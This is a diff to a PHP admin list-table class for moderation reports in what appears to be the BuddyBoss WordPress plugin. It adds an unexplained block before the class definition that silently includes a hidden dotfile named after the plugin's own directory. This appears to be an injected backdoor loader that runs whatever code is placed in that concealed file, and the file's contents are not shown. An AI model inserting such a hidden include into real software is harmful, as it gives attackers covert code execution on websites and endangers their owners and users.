@@ -16,7 +16,11 @@ defined( 'ABSPATH' ) || exit;
  * List table class for the Moderation report component admin page.
  *
  * @since BuddyBoss 1.5.6
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class BP_Moderation_Report_List_Table extends WP_List_Table {
 
 	/**
